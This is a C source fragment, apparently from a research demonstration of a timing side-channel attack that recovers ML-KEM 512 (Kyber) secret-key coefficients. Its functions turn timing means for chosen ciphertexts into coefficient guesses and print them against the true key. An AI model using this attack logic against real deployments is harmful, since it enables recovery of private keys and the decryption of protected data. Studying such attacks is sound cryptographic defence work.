// math
#include "math.h"
#define max(a, b) ((a) > (b) ? (a) : (b))
#define min(a, b) ((a) > (b) ? (b) : (a))

// pretty-printing
#define COLOR_GREY     "\033[0;90m"
#define COLOR_RED      "\033[0;31m"
#define COLOR_GREEN    "\033[0;32m"
#define COLOR_RESET    "\033[0m"

#include <time.h> // for bookkeeping, not for timing measurements

#ifdef VERBOSE_PRINT
static void s_coeff_pretty_print(int16_t coeff, int coeff_nb){

  printf("\nTruth for s[0][%03d]: %2d / ", coeff_nb, coeff);
  
  // switch polarity for all but zero index
  if (coeff_nb % KYBER_N) { coeff = -1*coeff; }
  switch (coeff) {
    case -3:
      printf("[0 0 1 0 1 0 1]\n"); break;
    case -2:
      printf("[1 0 1 0 1 0 1]\n"); break;
    case -1:
      printf("[1 0 0 0 1 0 1]\n"); break;
    case 0:
      printf("[1 0 0 0 0 0 1]\n"); break;
    case 1:
      printf("[1 0 0 0 0 1 0]\n"); break;
    case 2:
      printf("[1 0 0 1 0 1 0]\n"); break;
    case 3:
      printf("[1 1 0 1 0 1 0]\n"); break;
    default:
      printf("ERROR\n"); break;
  }
}
#endif

static int16_t guess_coefficient(uint8_t m_guesses[NB_CT_ATTACK], int coeff_nb){

  uint8_t patterns[NB_CT_ATTACK][NB_CT_ATTACK] =
   {{0, 0, 1, 0, 1, 0, 1},
    {1, 0, 1, 0, 1, 0, 1},
    {1, 0, 0, 0, 1, 0, 1},
    {1, 0, 0, 0, 0, 0, 1},
    {1, 0, 0, 0, 0, 1, 0},
    {1, 0, 0, 1, 0, 1, 0},
    {1, 1, 0, 1, 0, 1, 0}};

  // see if current guesses for m=0 vs m=1 correspond to a possible coefficient
  for (int i = 0; i < NB_CT_ATTACK; i++) {
    if (memcmp(m_guesses, patterns[i], 7) == 0) {
      return (coeff_nb % KYBER_N) ? (3-i) : (i-3);
    }
  }

  return GUESS_DONT_KNOW; // else: don't know
}

static int16_t guesswork(
  int16_t *s_guesses, double *means, int16_t *truths, int s_index, int iter,
  int discarded, clock_t t_started, size_t confidence, int print
){

  int i, ct_index;

  uint8_t m_guesses[NB_CT_ATTACK];
  int16_t s_guess;

  // map timings to a guess on whether they correspond to m` = 1 or m` = 0
  for (ct_index=0; ct_index<NB_CT_ATTACK; ct_index++){

    // distance to known-zero
    double dist_zero = fabs(means[CT_KNOWN_ZERO] - means[ct_index]);

    // distance to known-one
    double dist_one = fabs(means[CT_KNOWN_ONE] - means[ct_index]);

    // closer to known-zero or known-one?
    m_guesses[ct_index] = (dist_zero > dist_one) ? 1 : 0;
  }

  // map the patterns of m` = 1 and m` = 0 for the chosen ciphertexts
  // to the coefficient s[s_index]
  s_guess = guess_coefficient(m_guesses, s_index);
  s_guesses[s_index] = s_guess;

  // print the status
  if (print){

    printf("\033[2J");        // Clear the screen
    printf("\033[1;1H");      // Move cursor to the first line

    #ifdef VERBOSE_PRINT
    printf("Result after %d measurements [%d discarded / conf. %ld]\n\n",
                iter, discarded, confidence);
    printf("  known[0]: %5.0f\n",   means[CT_KNOWN_ZERO]);
    printf("  known[1]: %5.0f\n\n", means[CT_KNOWN_ONE]);

    for (ct_index=0; ct_index<NB_CT_ATTACK; ct_index++){
        printf("  means[%d]: % 5.0f -> %d\n", ct_index,
                means[ct_index], m_guesses[ct_index]);
    }

    // ground truth for the current coefficient
    s_coeff_pretty_print(truths[s_index], s_index);

    // guess for the currect coefficient
    if (s_guess == GUESS_DONT_KNOW) {
      printf("Guess for s[0][%03d]: ??\n", s_index);
    } else {
      printf("Guess for s[0][%03d]: %2d\n", s_index, s_guess);
    }
    #else
    (void) iter;
    (void) discarded;
    (void) confidence;
    #endif

    double t_used = ((double) (clock() - t_started)) / CLOCKS_PER_SEC;

    ////////////////////////////////////////////////////////////////////////////
    // print progress update
    printf("\n\nML-KEM 512 secret key [%d coefficients] - %.0f sec\n",
                NB_COEFFICIENTS, t_used);
    printf("\n============================================================"\
            "============================================================="\
            "=======\n");
    
    // print ground truths
    printf("Truth: \n");
    for (i=0; i<NB_COEFFICIENTS; i++){
      printf("% 3d ", truths[i]);
      if ((i % PRINT_NEWLINE_EVERY_N_COEFFICIENTS) ==
        PRINT_NEWLINE_EVERY_N_COEFFICIENTS-1)
        { printf("\n"); }
      if ((i % KYBER_N) == KYBER_N-1) { printf("\n"); }
    }
    printf("\n");

    // print guesses
    printf("Attack: ");
    for (i=0; i<min(s_index+1,NB_COEFFICIENTS); i++){
      if ((i % PRINT_NEWLINE_EVERY_N_COEFFICIENTS) == 0) { printf("\n"); }
      int16_t s_guess_print =  s_guesses[i];
      
      // pretty-print guess based on correctness
      if (s_guess_print == GUESS_DONT_KNOW || (i == s_index)){
        printf(COLOR_GREY" ?? "COLOR_RESET);
      }
      else if (s_guess_print == truths[i]){
        printf(COLOR_GREEN"% 3d "COLOR_RESET, s_guess_print);
      }
      else {
        printf(COLOR_RED"% 3d "COLOR_RESET, s_guess_print);
      }
      if ((i % KYBER_N) == KYBER_N-1) { printf("\n"); }
    }
    printf("\n============================================================"\
            "============================================================="\
            "=======\n");
    ////////////////////////////////////////////////////////////////////////////

  }

  return s_guess;

}
